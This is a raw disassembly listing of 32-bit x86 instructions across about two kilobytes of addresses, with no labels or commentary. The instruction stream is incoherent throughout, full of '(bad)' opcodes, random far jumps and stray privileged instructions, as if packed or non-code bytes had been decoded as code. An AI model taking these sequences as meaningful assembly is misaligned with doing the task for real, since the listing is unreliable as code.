  4026c4:	les    ebx,FWORD PTR [edi+0x0]
  4026c7:	add    BYTE PTR [eax],ch
  4026c9:	into   
  4026ca:	add    ecx,DWORD PTR [ebx]
  4026cc:	jmp    0xa1e8dae0
  4026d1:	xchg   ebx,eax
  4026d2:	push   cs
  4026d3:	cmp    edx,edx
  4026d5:	and    DWORD PTR [edx+0x5435a3ae],edi
  4026db:	xchg   ecx,eax
  4026dc:	dec    eax
  4026dd:	sub    eax,0xc7ff0000
  4026e2:	jle    0x402732
  4026e4:	pop    edx
  4026e5:	faddp  st(3),st
  4026e7:	fcomip st,st(3)
  4026e9:	push   0xf58483
  4026ee:	add    BYTE PTR [eax-0x4f],ah
  4026f1:	jmp    0x4026de
  4026f3:	xor    DWORD PTR [eax],0x5f40be6e
  4026f9:	add    BYTE PTR [eax],al
  4026fb:	mov    DWORD PTR [eax],eax
  4026fd:	jbe    0x4026ff
  4026ff:	add    BYTE PTR [eax+0x97fbacf],bh
  402705:	dec    ebx
  402706:	sahf   
  402707:	jmp    0xa92b447c
  40270c:	push   ebx
  40270d:	push   esi
  40270e:	dec    ebx
  40270f:	dec    ebx
  402710:	jg     0x402714
  402712:	add    BYTE PTR [edx+0x0],bh
  402715:	add    BYTE PTR [ebp+0x50],cl
  402718:	mov    ?,WORD PTR [edx-0x6b9a5c37]
  40271e:	mov    ch,0x3c
  402720:	mov    esi,0x3a70307d
  402725:	aaa    
  402726:	(bad)  
  402727:	and    BYTE PTR ds:0xa2cdab65,bh
  40272d:	sti    
  40272e:	iret   
  40272f:	aas    
  402730:	lods   eax,DWORD PTR ds:[esi]
  402731:	pop    edi
  402732:	mov    al,0x2d
  402734:	cmp    BYTE PTR [edi+ebp*2-0x22a90000],cl
  40273b:	xlat   BYTE PTR ds:[ebx]
  40273c:	mov    ecx,0x62175172
  402741:	sub    al,0x1c
  402743:	test   DWORD PTR ss:[edi+0x60],ebx
  402747:	pop    ss
  402748:	pop    edi
  402749:	fistp  QWORD PTR [edx-0x31]
  40274c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40274d:	add    dl,BYTE PTR [esi+0x6]
  402750:	xlat   BYTE PTR ds:[ebx]
  402751:	icebp  
  402752:	push   ebx
  402753:	xor    BYTE PTR [ebp-0x4e],ch
  402756:	es (bad) 
  402758:	pusha  
  402759:	or     al,0x7b
  40275b:	add    BYTE PTR [eax],al
  40275d:	cmc    
  40275e:	add    BYTE PTR ds:[ebx+0x59090000],ah
  402765:	push   esp
  402766:	xchg   DWORD PTR [edi-0x6fd9c455],edi
  40276c:	push   0xc2a86a5d
  402771:	test   al,0xec
  402773:	retf   0x37e9
  402776:	mov    dl,al
  402778:	add    BYTE PTR [eax],al
  40277a:	out    0xd3,al
  40277c:	and    eax,0xb4b4f727
  402781:	adc    edi,eax
  402783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402784:	lock cli 
  402786:	das    
  402787:	loope  0x4027ca
  402789:	push   0x51
  40278b:	lods   al,BYTE PTR ds:[esi]
  40278c:	pop    esp
  40278d:	aam    0xa2
  40278f:	and    eax,0x6e5370d7
  402794:	jnp    0x40280f
  402796:	ret    
  402797:	jecxz  0x4027af
  402799:	pop    edx
  40279a:	in     eax,0x6b
  40279c:	ins    BYTE PTR es:[edi],dx
  40279d:	test   BYTE PTR [edx+0x0],cl
  4027a0:	add    BYTE PTR [edx+edx*2],bh
  4027a3:	inc    edx
  4027a4:	out    0xc5,eax
  4027a6:	cmp    ah,BYTE PTR [ebx+0x1a669470]
  4027ac:	adc    al,ch
  4027ae:	inc    ebx
  4027af:	mov    ch,dl
  4027b1:	add    BYTE PTR [eax],al
  4027b3:	jl     0x402796
  4027b5:	push   0x38
  4027b7:	xor    edx,DWORD PTR [esi-0x3f]
  4027ba:	sbb    DWORD PTR [edx+0x76],ebx
  4027bd:	and    al,0x9d
  4027bf:	or     ah,dh
  4027c1:	add    BYTE PTR [eax],al
  4027c3:	test   DWORD PTR [edi+0x544f5bdf],esp
  4027c9:	mov    ds:0xe53bbdb9,eax
  4027ce:	jno    0x402806
  4027d0:	fistp  DWORD PTR [edx]
  4027d2:	hlt    
  4027d3:	test   eax,0xfd62897f
  4027d8:	ins    BYTE PTR es:[edi],dx
  4027d9:	cs nop
  4027db:	push   ss
  4027dc:	aas    
  4027dd:	out    0xd,al
  4027df:	into   
  4027e0:	aas    
  4027e1:	pushf  
  4027e2:	pop    edi
  4027e3:	icebp  
  4027e4:	das    
  4027e5:	gs cmp al,0x98
  4027e8:	into   
  4027e9:	add    eax,0x5cb2bee7
  4027ee:	dec    ecx
  4027ef:	inc    ecx
  4027f0:	test   DWORD PTR [eax],ebp
  4027f2:	jb     0x4027bd
  4027f4:	popf   
  4027f5:	sub    BYTE PTR [ebp-0x37],bl
  4027f8:	ins    DWORD PTR es:[edi],dx
  4027f9:	cmp    dl,cl
  4027fb:	(bad)  
  4027fc:	jl     0x40280c
  4027fe:	into   
  4027ff:	aad    0x3d
  402801:	add    al,0xb7
  402803:	add    BYTE PTR [eax],al
  402805:	xchg   BYTE PTR [edi-0x5e],ch
  402808:	jo     0x402839
  40280a:	enter  0x4e,0x0
  40280e:	clc    
  40280f:	dec    edi
  402810:	dec    esi
  402811:	(bad)  
  402812:	push   edx
  402813:	loope  0x4027c3
  402815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402816:	sub    eax,0xfc48dfc2
  40281b:	add    BYTE PTR [eax],al
  40281d:	cmp    eax,0xa96a2606
  402822:	bound  edx,QWORD PTR [edx]
  402824:	js     0x402859
  402826:	pop    ebp
  402827:	cs push ds
  402829:	test   eax,0x3544
  40282e:	jb     0x40282e
  402830:	jns    0x402862
  402832:	push   0xffffffba
  402834:	cmp    eax,0x367412aa
  402839:	sbb    eax,0x64a91a2a
  40283e:	sar    DWORD PTR [edi+0x64],0xfc
  402842:	xor    ah,BYTE PTR [ecx+eax*8+0x561f9b54]
  402849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40284a:	push   esp
  40284b:	push   ds
  40284c:	fist   DWORD PTR [edi+0x3625429c]
  402852:	add    ah,bl
  402854:	add    BYTE PTR [eax],al
  402856:	push   cs
  402857:	daa    
  402858:	push   ebp
  402859:	add    bh,bl
  40285b:	add    BYTE PTR [eax],al
  40285d:	adc    cl,bh
  40285f:	mov    al,ds:0xe904
  402864:	push   edx
  402865:	mov    edx,0x23f254c7
  40286a:	enter  0xfe,0x0
  40286e:	ins    BYTE PTR es:[edi],dx
  40286f:	mov    esp,0x44402c39
  402874:	add    BYTE PTR [eax],al
  402876:	mov    esp,0xd207fefe
  40287b:	jg     0x4028bb
  40287d:	mov    bh,BYTE PTR [edi]
  40287f:	in     eax,0xe5
  402881:	and    eax,0xace5ffd8
  402886:	xchg   ebx,eax
  402887:	push   ecx
  402888:	jecxz  0x402823
  40288a:	(bad)  
  40288b:	and    ebx,DWORD PTR [edx+0x2b44716f]
  402891:	add    BYTE PTR [eax],al
  402893:	mov    eax,ds:0x3a928291
  402898:	repnz loop 0x4028bd
  40289b:	jl     0x4028a8
  40289d:	and    eax,0x3c8eb4ae
  4028a2:	in     eax,0x24
  4028a4:	or     cl,BYTE PTR [ebp-0x66]
  4028a7:	cmp    ah,BYTE PTR [ecx-0x20c5d77d]
  4028ad:	mov    edx,0xfc9bd667
  4028b2:	aaa    
  4028b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028b4:	stos   DWORD PTR es:[edi],eax
  4028b5:	mov    al,ds:0x70ba36d
  4028ba:	xor    BYTE PTR [eax-0x3c93794e],ah
  4028c0:	sbb    BYTE PTR [ecx],bh
  4028c2:	xlat   BYTE PTR ds:[ebx]
  4028c3:	retf   0x7dbc
  4028c6:	fstp   TBYTE PTR [edx]
  4028c8:	jbe    0x4028a9
  4028ca:	stos   BYTE PTR es:[edi],al
  4028cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028cc:	or     ch,BYTE PTR [ebx+ebp*1-0x2c]
  4028d0:	push   ss
  4028d1:	mov    ds:0xfb94f4aa,eax
  4028d6:	push   ss
  4028d7:	mov    ds:0xe69085ae,eax
  4028dc:	les    ebx,FWORD PTR [ebx+0x0]
  4028df:	add    BYTE PTR [ebp+edi*8+0x0],cl
  4028e3:	add    BYTE PTR [edx],bh
  4028e5:	sbb    ah,BYTE PTR [edi]
  4028e7:	xchg   esi,eax
  4028e8:	aas    
  4028e9:	push   edi
  4028ea:	pop    ebp
  4028eb:	mov    edx,edi
  4028ed:	in     al,0x37
  4028ef:	iret   
  4028f0:	pop    ss
  4028f1:	ret    0x9b71
  4028f4:	xlat   BYTE PTR ds:[ebx]
  4028f5:	outs   dx,DWORD PTR ds:[esi]
  4028f6:	test   eax,0xc8363fcd
  4028fb:	xchg   edx,eax
  4028fc:	add    BYTE PTR [eax],al
  4028fe:	jo     0x4028ac
  402900:	add    al,bh
  402902:	mov    cl,0x39
  402904:	loop   0x40288a
  402906:	xchg   esp,eax
  402907:	add    BYTE PTR [eax],al
  402909:	jmp    FWORD PTR [ecx-0x283e945e]
  40290f:	je     0x40297e
  402911:	add    BYTE PTR [edx+0x0],dh
  402914:	add    BYTE PTR [edi-0x1b],ch
  402917:	push   0xffffffc7
  402919:	jne    0x4028ff
  40291b:	mov    edx,0x713ecb71
  402920:	(bad)  
  402921:	push   ebp
  402922:	sub    ch,BYTE PTR [eax]
  402924:	inc    ebx
  402925:	scas   eax,DWORD PTR es:[edi]
  402926:	jb     0x402999
  402928:	js     0x402966
  40292a:	dec    ecx
  40292b:	ss (bad) 
  40292d:	aas    
  40292e:	push   esp
  40292f:	add    bh,ch
  402931:	test   al,0x76
  402933:	mov    esi,0xf1e26775
  402938:	inc    edi
  402939:	or     eax,DWORD PTR [ebx-0x7f]
  40293c:	xchg   ebx,eax
  40293d:	push   0x5a
  40293f:	jnp    0x4028f5
  402941:	ss dec edi
  402943:	sub    al,0x82
  402945:	xor    eax,0xeef773fd
  40294a:	imul   esi,DWORD PTR [ecx-0x43195e5e],0xffffff8a
  402951:	lods   al,BYTE PTR ds:[esi]
  402952:	aas    
  402953:	xchg   edi,eax
  402954:	sar    BYTE PTR [ecx+edx*4+0x36],1
  402958:	and    bh,BYTE PTR ds:0x42de73be
  40295e:	push   eax
  40295f:	jb     0x40291c
  402961:	fs sub bh,BYTE PTR ss:[esi+0x7a9f8623]
  402969:	in     eax,0x5f
  40296b:	jae    0x40298f
  40296d:	or     BYTE PTR [eax+eax*1+0x48277a00],al
  402974:	sub    eax,0xde680000
  402979:	outs   dx,BYTE PTR ds:[esi]
  40297a:	push   es
  40297b:	dec    edx
  40297c:	mov    ds:0xfc227102,eax
  402981:	lea    edi,[edx-0x2bcdbab0]
  402987:	jne    0x4029d9
  402989:	inc    edx
  40298a:	shl    DWORD PTR [ecx+0x6d598520],1
  402990:	cmp    ch,cl
  402992:	mov    dl,0xe4
  402994:	sub    ch,BYTE PTR [eax+eax*4]
  402997:	pusha  
  402998:	add    BYTE PTR [eax],al
  40299a:	cmp    esi,DWORD PTR [esi+0x1b]
  40299d:	pop    sp
  40299f:	jae    0x402999
  4029a1:	mov    eax,0x8bbfdd64
  4029a6:	jmp    0x29e94e48
  4029ab:	sahf   
  4029ac:	jmp    0x4029d7
  4029ae:	je     0x4029c6
  4029b0:	es cld 
  4029b2:	out    dx,al
  4029b3:	(bad)  
  4029b4:	mov    fs,WORD PTR [ebx+0x68302554]
  4029ba:	arpl   WORD PTR [ebx+0x8f80fd],di
  4029c0:	add    BYTE PTR [esi-0x79b5044],ch
  4029c6:	stos   BYTE PTR es:[edi],al
  4029c7:	(bad)  
  4029c8:	clc    
  4029c9:	enter  0x55,0x0
  4029cd:	push   ss
  4029ce:	mov    esp,DWORD PTR [esi+ebp*4-0x2b]
  4029d2:	mov    ds:0x264eae07,eax
  4029d7:	inc    ecx
  4029d8:	mov    ds:0xe13173a9,eax
  4029dd:	in     eax,dx
  4029de:	and    esp,DWORD PTR [eax]
  4029e0:	mov    edi,0xc7902efc
  4029e5:	mov    al,0xc1
  4029e7:	push   ecx
  4029e8:	jne    0x402a40
  4029ea:	inc    eax
  4029eb:	ret    0x0
  4029ee:	mov    al,ds:0x9e0424
  4029f3:	add    BYTE PTR [edi+0x7739e663],cl
  4029f9:	or     al,0x6a
  4029fb:	add    BYTE PTR [eax],al
  4029fd:	sub    al,BYTE PTR [ecx]
  4029ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a00:	sahf   
  402a01:	in     eax,0xbe
  402a03:	ss push ecx
  402a05:	and    eax,0xad44
  402a0a:	mov    ss,ebp
  402a0c:	mov    ebp,0xd092b68e
  402a11:	and    eax,edi
  402a13:	pushf  
  402a14:	(bad)  
  402a15:	mov    esi,0xc22a4d36
  402a1a:	pop    ecx
  402a1b:	xchg   ebp,eax
  402a1c:	mov    dh,0xd5
  402a1e:	jg     0x402a0a
  402a20:	mov    ebp,0xae662470
  402a25:	add    eax,0x455c73db
  402a2a:	xor    dh,BYTE PTR [eax-0x3f87409e]
  402a30:	inc    BYTE PTR [eax]
  402a32:	add    bh,ch
  402a34:	lea    esp,[edx+0x6dfde433]
  402a3a:	add    DWORD PTR [edx+esi*1+0x3b],edx
  402a3e:	stc    
  402a3f:	loop   0x402a1e
  402a41:	or     bh,cl
  402a43:	imul   esi,DWORD PTR [ebx+0x75],0x74066867
  402a4a:	add    ebx,DWORD PTR [edi+ebp*1-0x2]
  402a4e:	enter  0x5b,0x0
  402a52:	cmp    edx,eax
  402a54:	pop    ds
  402a55:	mov    ecx,0x7484e0
  402a5a:	add    BYTE PTR ds:0x269eeb28,dl
  402a60:	mov    dl,0xc9
  402a62:	les    ecx,FWORD PTR [esi+0x14ab0000]
  402a68:	out    0xd2,eax
  402a6a:	and    edx,DWORD PTR [eax+ebp*4]
  402a6d:	mov    ds:0xc621bf8b,eax
  402a72:	aad    0xdb
  402a74:	ret    0x7406
  402a77:	shr    DWORD PTR [eax-0x14008667],1
  402a7d:	inc    esp
  402a7e:	mov    WORD PTR [eax],es
  402a80:	add    BYTE PTR [ecx+0x11],dh
  402a83:	sub    esi,DWORD PTR [ebx+0x1aaeea33]
  402a89:	scas   al,BYTE PTR es:[edi]
  402a8a:	je     0x402af0
  402a8c:	or     DWORD PTR [edi-0x11],edx
  402a8f:	mov    edi,0x5cc7264
  402a94:	add    BYTE PTR [eax],al
  402a96:	jp     0x402b00
  402a98:	data16 or BYTE PTR [esi+0x0],ch
  402a9c:	add    BYTE PTR [ebx],ch
  402a9e:	mov    dl,BYTE PTR [ebx]
  402aa0:	shl    BYTE PTR [edi],cl
  402aa2:	mov    ebp,0x122a54b2
  402aa7:	and    al,0xfb
  402aa9:	mov    ?,WORD PTR ds:0xf7a9aff8
  402aaf:	sbb    BYTE PTR [ecx+0x58fe3a56],dh
  402ab5:	ret    0x310b
  402ab8:	push   ebx
  402ab9:	out    dx,al
  402aba:	loopne 0x402a63
  402abc:	mov    gs,ecx
  402abe:	rcl    BYTE PTR [eax+0x0],0x0
  402ac2:	cli    
  402ac3:	gs ret 0xb091
  402ac7:	sub    al,0x2a
  402ac9:	add    eax,0xdcbd1ef0
  402ace:	sbb    eax,0x4d88
  402ad3:	rcr    BYTE PTR [edx+0x75],cl
  402ad6:	aad    0x2a
  402ad8:	js     0x402b57
  402ada:	(bad)  
  402adb:	mov    edi,0x64ab273a
  402ae0:	cwde   
  402ae1:	adc    edi,ecx
  402ae3:	mov    ds:0x64ba7e5a,eax
  402ae8:	add    ah,BYTE PTR [ecx]
  402aea:	mov    ah,0x4
  402aec:	push   ds
  402aed:	add    BYTE PTR [eax],al
  402aef:	das    
  402af0:	or     BYTE PTR [ecx+0x0],0x0
  402af4:	dec    ebp
  402af5:	fs inc ebx
  402af7:	pop    ds
  402af8:	pop    esi
  402af9:	and    eax,DWORD PTR [ebx]
  402afb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402afc:	mov    eax,0xc3569972
  402b01:	in     al,0x6c
  402b03:	xor    BYTE PTR [ebx-0xc],cl
  402b06:	test   BYTE PTR [ecx+0x0],ch
  402b09:	add    bl,dh
  402b0b:	inc    edx
  402b0c:	sbb    al,0x4d
  402b0e:	xor    esi,DWORD PTR [ebp+0x2358e921]
  402b14:	mov    ecx,0x7a7307a3
  402b19:	test   dh,dl
  402b1b:	add    BYTE PTR [eax],al
  402b1d:	jbe    0x402ab5
  402b1f:	xor    al,0xab
  402b21:	and    edx,DWORD PTR [ecx-0x2969e2a3]
  402b27:	imul   esp,eax,0xffffff8a
  402b2a:	lds    esp,FWORD PTR [ebp-0x58]
  402b2d:	cmp    DWORD PTR [edi-0x4],esi
  402b30:	push   0xffffff9e
  402b32:	jo     0x402b69
  402b34:	les    esp,FWORD PTR ds:0x5a710000
  402b3a:	sub    DWORD PTR [edx+0x6839ac12],edi
  402b40:	or     eax,0x40082472
  402b45:	add    BYTE PTR [eax],al
  402b47:	jb     0x402b92
  402b49:	enter  0x7c,0x0
  402b4d:	aas    
  402b4e:	lea    esi,[eax]
  402b50:	ret    0xafb
  402b53:	push   0xed54b654
  402b58:	call   0x6fb59fee
  402b5d:	(bad)  
  402b5e:	bound  ebp,QWORD PTR [edx-0x88b85d6]
  402b64:	inc    esp
  402b65:	das    
  402b66:	add    BYTE PTR [eax],al
  402b68:	and    edi,esi
  402b6a:	jno    0x402aff
  402b6c:	call   0xeaa1:0xc742ad9a
  402b73:	jbe    0x402bb3
  402b75:	push   0x705ae81e
  402b7a:	dec    esi
  402b7b:	mov    ebp,0x5d056c2d
  402b80:	jp     0x402b87
  402b82:	fistp  QWORD PTR [ebp-0xc]
  402b85:	push   ebp
  402b86:	aaa    
  402b87:	scas   al,BYTE PTR es:[edi]
  402b88:	add    cl,al
  402b8a:	add    BYTE PTR [eax],al
  402b8c:	and    DWORD PTR [edx+0x5c],edx
  402b8f:	mov    ds:0x340c5e2f,eax
  402b94:	add    BYTE PTR [eax],al
  402b96:	mov    bl,0xfb
  402b98:	mov    ds:0xd67522ab,eax
  402b9d:	into   
  402b9e:	rcr    BYTE PTR [ebx],1
  402ba0:	mov    al,ds:0x34728d4d
  402ba5:	fstp   QWORD PTR [esi+edi*2+0x3a]
  402ba9:	daa    
  402baa:	call   DWORD PTR [esi+0x2d]
  402bad:	test   eax,0x259a73fe
  402bb2:	(bad)  
  402bb3:	fst    DWORD PTR [ecx]
  402bb5:	rcr    DWORD PTR [ebp+0x75],1
  402bb8:	je     0x402bc7
  402bba:	inc    esp
  402bbb:	mov    al,ds:0x137a0000
  402bc0:	sub    DWORD PTR [esi+0x702a9e75],edi
  402bc6:	aaa    
  402bc7:	ret    
  402bc8:	dec    edi
  402bc9:	jae    0x402c07
  402bcb:	mov    esp,DWORD PTR [edx+0x30]
  402bce:	mov    ds:0x1332abee,eax
  402bd3:	push   ebx
  402bd4:	and    bl,BYTE PTR [esi-0x4ec7124e]
  402bda:	jb     0x402c51
  402bdc:	sub    al,0x70
  402bde:	(bad)  
  402bdf:	mul    DWORD PTR [edi]
  402be1:	jns    0x402c11
  402be3:	in     eax,0xa8
  402be5:	sub    al,0xf5
  402be7:	ja     0x402bf8
  402be9:	xor    eax,0xc9c00382
  402bee:	add    BYTE PTR [eax],al
  402bf0:	dec    ecx
  402bf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bf2:	push   ss
  402bf3:	in     eax,0x60
  402bf5:	pop    DWORD PTR [esi]
  402bf7:	mov    edx,0x2f44
  402bfc:	mov    BYTE PTR [edi+0x0],al
  402bff:	add    al,dh
  402c01:	div    DWORD PTR [esi-0x6]
  402c04:	and    ebp,DWORD PTR [edx]
  402c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c07:	mov    dl,0x86
  402c09:	pop    edi
  402c0a:	add    eax,0x2df13d6f
  402c0f:	add    esp,ebp
  402c11:	and    eax,0xbfecacd0
  402c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c17:	adc    bl,BYTE PTR [edi+esi*1+0x47]
  402c1b:	mov    dl,0x86
  402c1d:	jmp    0x9854fb7
  402c22:	pop    esi
  402c23:	xchg   esi,eax
  402c24:	cli    
  402c25:	ds cli 
  402c27:	daa    
  402c28:	jecxz  0x402c90
  402c2a:	(bad)  
  402c2b:	div    esp
  402c2d:	jle    0x402c2b
  402c2f:	xchg   BYTE PTR [ecx+0x28],ah
  402c32:	and    BYTE PTR [ebx],bl
  402c34:	jb     0x402bf2
  402c36:	popa   
  402c37:	(bad)  [ebx-0xd3fc31e]
  402c3d:	add    BYTE PTR [eax],al
  402c3f:	nop
  402c40:	adc    eax,DWORD PTR [ecx+0x2bbc3911]
  402c46:	fldcw  WORD PTR [eax+0xd828641]
  402c4c:	mov    ds:0x54b59ae4,al
  402c51:	inc    esp
  402c52:	mov    edi,0xc1f00000
  402c57:	mov    ds:0x54f83b36,al
  402c5c:	inc    eax
  402c5d:	out    dx,al
  402c5e:	add    BYTE PTR [eax],al
  402c60:	call   0x40e765
  402c65:	cmp    DWORD PTR [ecx-0x2],eax
  402c68:	inc    esp
  402c69:	pop    ebp
  402c6a:	add    BYTE PTR [eax],al
  402c6c:	adc    bl,BYTE PTR [esi+0x566786d1]
  402c72:	rcl    BYTE PTR [eax+0x0],0x0
  402c76:	push   edx
  402c77:	push   esi
  402c78:	pushf  
  402c79:	retf   
  402c7a:	std    
  402c7b:	mov    bl,0xf1
  402c7d:	(bad)  
  402c7e:	in     al,0xfe
  402c80:	mov    ch,BYTE PTR [esi+eax*4]
  402c83:	and    eax,0xa8cc8d0d
  402c88:	add    BYTE PTR [eax],al
  402c8a:	mov    ds:0x222416de,eax
  402c8f:	dec    ebp
  402c90:	aaa    
  402c91:	retf   0x338
  402c94:	fcmove st,st(0)
  402c96:	or     al,0x0
  402c98:	add    BYTE PTR [esi-0x4a],bh
  402c9b:	mov    bh,0xe5
  402c9d:	pop    esp
  402c9e:	pop    ds
  402c9f:	mov    BYTE PTR [edi+0x3070000],ah
  402ca5:	imul   ebp,DWORD PTR [esi],0xffffffc7
  402ca8:	mov    ebp,0xfc2e3494
  402cad:	mov    cl,BYTE PTR [edi-0x63fb14a8]
  402cb3:	add    BYTE PTR [eax],al
  402cb5:	dec    esi
  402cb6:	scas   al,BYTE PTR es:[edi]
  402cb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb8:	inc    BYTE PTR [ebp+0x6e556656]
  402cbe:	loope  0x402c85
  402cc0:	popf   
  402cc1:	jmp    0x6d00:0x62404e
  402cc8:	outs   dx,BYTE PTR ds:[esi]
  402cc9:	mov    DWORD PTR [esi-0x54],ebp
  402ccc:	mov    ebx,0xd5fd32e7
  402cd1:	ret    0xab29
  402cd4:	mov    eax,0x688ac5ab
  402cd9:	xlat   BYTE PTR ds:[ebx]
  402cda:	fidiv  WORD PTR [eax+0xd]
  402cdd:	pop    edx
  402cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cdf:	inc    edi
  402ce0:	xlat   BYTE PTR ds:[ebx]
  402ce1:	cmp    dl,BYTE PTR [ecx+0x4b08ee]
  402ce7:	add    BYTE PTR [eax+edx*8+0x2a],ch
  402ceb:	inc    edi
  402cec:	or     BYTE PTR [edi+0x73aa0000],bh
  402cf2:	sbb    BYTE PTR [esi+0x39c90000],0x75
  402cf9:	push   ebp
  402cfa:	out    0xf6,al
  402cfc:	mov    dh,0x93
  402cfe:	mov    esi,fs
  402d00:	add    BYTE PTR [eax],al
  402d02:	in     eax,0xa3
  402d04:	fldl2t 
  402d06:	xor    dh,bh
  402d08:	jno    0x402d4c
  402d0a:	dec    edx
  402d0b:	add    BYTE PTR [ebp+0x45840000],bh
  402d11:	add    BYTE PTR [eax],al
  402d13:	add    eax,0xb78b3ad
  402d18:	sar    BYTE PTR [edx],cl
  402d1a:	cdq    
  402d1b:	xchg   edx,eax
  402d1c:	rol    BYTE PTR [ecx+0x3cebeba4],1
  402d22:	xor    dh,BYTE PTR [eax+0x7e72524f]
  402d28:	push   eax
  402d29:	jo     0x402d5d
  402d2b:	dec    edi
  402d2c:	and    al,0x2a
  402d2e:	adc    ch,BYTE PTR [ebx-0x5f7c78cc]
  402d34:	cmp    BYTE PTR [edx+ebx*4+0x75136996],ch
  402d3b:	fild   QWORD PTR ds:[esi-0x5bc7199b]
  402d42:	xor    ebp,DWORD PTR [ebx]
  402d44:	mov    esi,0x3bca3076
  402d49:	or     ah,bh
  402d4b:	scas   eax,DWORD PTR es:[edi]
  402d4c:	fisttp WORD PTR [ebx-0x4e]
  402d4f:	cli    
  402d50:	icebp  
  402d51:	inc    esp
  402d52:	push   0x0
  402d54:	add    BYTE PTR [ebx-0x6f],dh
  402d57:	jnp    0x402d69
  402d59:	jns    0x402cf9
  402d5b:	and    BYTE PTR [edx-0x75db4d05],cl
  402d61:	xchg   ecx,eax
  402d62:	adc    DWORD PTR [edi-0x4f],edx
  402d65:	or     BYTE PTR [eax+0x0],dh
  402d68:	add    BYTE PTR [eax-0x4d],al
  402d6b:	add    BYTE PTR [eax],al
  402d6d:	lea    edi,ds:[edi]
  402d70:	mov    ds:0x5a8c49a5,eax
  402d75:	add    BYTE PTR [eax],al
  402d77:	sbb    ebp,DWORD PTR [ebp+0x7]
  402d7a:	arpl   bx,di
  402d7c:	pop    edi
  402d7d:	sbb    al,BYTE PTR [eax]
  402d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d80:	add    BYTE PTR [eax],al
  402d82:	sub    eax,0xcf948631
  402d87:	aas    
  402d88:	add    dh,BYTE PTR [esi]
  402d8a:	test   BYTE PTR [eax-0x7a750000],bl
  402d90:	mov    edx,0x9a74bcda
  402d95:	loop   0x402d56
  402d97:	fiadd  DWORD PTR [edx]
  402d99:	sub    DWORD PTR [edi],esp
  402d9b:	js     0x402e0a
  402d9d:	nop
  402d9e:	cmp    BYTE PTR ds:0xab0c30,bh
  402da4:	add    ch,ch
  402da6:	adc    al,0x41
  402da9:	or     DWORD PTR [eax+0x5e],esp
  402dac:	mov    ds:0xbe682ccd,eax
  402db1:	mov    edi,0x6232b0fe
  402db6:	lea    eax,es:[ecx+ebp*4-0x5d840000]
  402dbe:	test   DWORD PTR [ebx+0x4ec44b3d],esp
  402dc4:	add    BYTE PTR [eax],al
  402dc6:	clc    
  402dc7:	cmp    DWORD PTR [eax-0x77],esp
  402dca:	outs   dx,BYTE PTR ds:[esi]
  402dcb:	mov    ebp,0xfbed4754
  402dd0:	shl    BYTE PTR [edx+0x30],cl
  402dd3:	out    dx,al
  402dd4:	jnp    0x402db7
  402dd6:	mov    BYTE PTR [edi+0x0],bh
  402dd9:	add    BYTE PTR [eax+0x33],bh
  402ddc:	fld    TBYTE PTR [ecx]
  402dde:	es retf 0x94b3
  402de2:	jge    0x402dad
  402de4:	iret   
  402de5:	inc    ebx
  402de6:	imul   edi,DWORD PTR [edx],0xffffffef
  402de9:	xchg   esi,eax
  402dea:	aas    
  402deb:	inc    edx
  402dec:	pop    esi
  402ded:	cmp    bl,BYTE PTR es:[edx+0x43]
  402df1:	mov    eax,ds:0xcb42aa27
  402df6:	xor    edx,DWORD PTR [ebp-0x41ea5008]
  402dfc:	inc    eax
  402dfd:	test   al,0x0
  402dff:	add    BYTE PTR [ecx],bl
  402e01:	and    BYTE PTR [esi+eax*4-0x7e54410b],dh
  402e08:	inc    esp
  402e09:	mov    dh,0x0
  402e0b:	add    BYTE PTR [edx-0x217c6b28],ah
  402e11:	sub    bh,cl
  402e13:	pop    ss
  402e14:	imul   eax,ebx,0xfffffffc
  402e17:	lahf   
  402e18:	out    0x91,al
  402e1a:	cmp    ch,cl
  402e1c:	sub    bh,BYTE PTR [esi+0x3a]
  402e1f:	out    0x1c,eax
  402e21:	xor    DWORD PTR [ecx-0x6fe76e7b],edx
  402e27:	push   0xc
  402e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e2a:	add    BYTE PTR [eax],al
  402e2c:	cwde   
  402e2d:	test   DWORD PTR [edi],0xe159a7b8
  402e33:	cwde   
  402e34:	push   ecx
  402e35:	xor    al,0x6a
  402e37:	out    dx,al
  402e38:	jmp    0x1f92bf71
  402e3d:	sti    
  402e3e:	xor    DWORD PTR ds:0x2765b15e,edi
  402e44:	repnz aaa 
  402e46:	jae    0x402e4f
  402e48:	xor    BYTE PTR [ecx-0x4e74af6e],cl
  402e4e:	stc    
  402e4f:	adc    BYTE PTR [ecx-0x5a6da57a],dl
  402e55:	pop    esi
  402e56:	mov    eax,ds:0x7f76a4b5
  402e5b:	dec    esi
  402e5c:	and    al,0x33
  402e5e:	cmp    esp,DWORD PTR [edi+0xa]
  402e61:	xchg   BYTE PTR [edi+0x7626b1ed],ah
  402e67:	out    dx,al
  402e68:	out    0x92,al
  402e6a:	push   bp
  402e6c:	fldcw  WORD PTR [ebx]
  402e6e:	ja     0x402e88
  402e70:	cli    
  402e71:	clc    
  402e72:	xor    eax,DWORD PTR [edi*1-0x4fa00000]
  402e79:	dec    ebx
  402e7a:	stc    
  402e7b:	test   dh,cl
  402e7d:	add    BYTE PTR [eax],al
  402e7f:	add    BYTE PTR [ebp+0x0],ah
  402e82:	add    bl,bh
  402e84:	or     eax,0xa9711ee0
  402e89:	xchg   ecx,eax
  402e8a:	je     0x402e4c
  402e8c:	je     0x402e8e
  402e8e:	add    BYTE PTR [ecx+0x5afb8a32],cl
  402e94:	daa    
  402e95:	xor    BYTE PTR [eax+0x6c],ah
  402e98:	and    BYTE PTR [ebp+0x4befb8bc],cl
  402e9e:	jge    0x402e54
  402ea0:	mov    esi,0x90383428
  402ea5:	and    al,0x2a
